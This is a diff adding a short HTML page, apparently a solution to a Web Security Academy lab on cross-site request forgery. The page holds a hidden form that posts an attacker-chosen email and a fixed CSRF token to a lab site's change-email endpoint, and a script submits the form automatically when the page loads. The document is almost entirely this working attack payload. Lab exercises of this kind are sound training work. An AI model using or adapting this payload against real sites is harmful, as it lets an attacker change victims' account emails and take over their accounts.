@@ -1,0 +1,22 @@
+```
+<html>
+  <body>
+    <form
+      action="https://0a6a00ce0464809b8032d0dc009800d5.web-security-academy.net/my-account/change-email"
+      method="POST"
+    >
+      <input type="hidden" name="email" value="my@evil-email.ne2t" />
+
+      <input
+        required=""
+        type="hidden"
+        name="csrf"
+        value="HmODn47sXp1BI1R9YyOEALaWsIjXo3Y4"
+      />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
